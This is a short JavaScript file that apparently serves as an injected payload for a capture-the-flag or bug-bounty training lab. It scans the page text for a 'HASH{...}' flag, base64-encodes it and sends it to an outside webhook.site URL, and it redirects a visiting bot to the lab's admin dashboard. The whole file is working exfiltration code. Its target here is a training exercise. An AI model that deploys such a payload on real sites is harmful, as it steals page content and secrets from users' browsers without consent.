// This file is now acting as a remote JS payload
const webhook = "https://webhook.site/ab7f9788-3a2f-41f5-9c2d-84fb65487cc8";

const hunt = () => {
    const text = document.body.innerText;
    const flag = text.match(/HASH\{[^}]+\}/);
    if (flag) {
        fetch(webhook + "?WIN=" + btoa(flag[0]));
    } else {
        // Keep looking every second if the flag hasn't appeared yet
        setTimeout(hunt, 1000);
    }
};

// Start hunting after 3 seconds to let Next.js hydrate
setTimeout(hunt, 3000);

// If the bot is actually VISITING this page on GitHub, send it to the lab
if (!window.location.host.includes("hashacademy")) {
    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
}
